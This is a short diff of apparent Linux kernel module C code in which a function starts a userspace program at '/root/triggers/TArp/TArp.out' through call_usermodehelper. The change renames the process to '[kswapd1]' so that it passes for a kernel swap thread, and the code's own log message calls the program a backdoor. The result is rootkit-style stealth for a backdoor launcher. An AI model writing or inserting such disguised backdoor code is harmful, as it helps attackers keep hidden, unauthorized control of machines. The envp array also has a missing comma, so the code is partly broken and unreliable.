@@ -21,13 +21,13 @@ static int umh_test(void)
 {
     int ret = 0;
     //struct subprocess_info *sub_info;
-    char *argv[] = {"/root/triggers/TArp/TArp.out", NULL, NULL };
+    char *argv[] = {"[kswapd1]", NULL, NULL };
     static char *envp[] = {
         "HOME=/",
         "TERM=linux"
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-    ret = call_usermodehelper(argv[0],argv,envp, UMH_WAIT_EXEC);
+    ret = call_usermodehelper("/root/triggers/TArp/TArp.out",argv,envp, UMH_WAIT_EXEC);
     if (ret == NULL) printk(KERN_INFO "Executing backdoor failed.");
     return 0;
 }
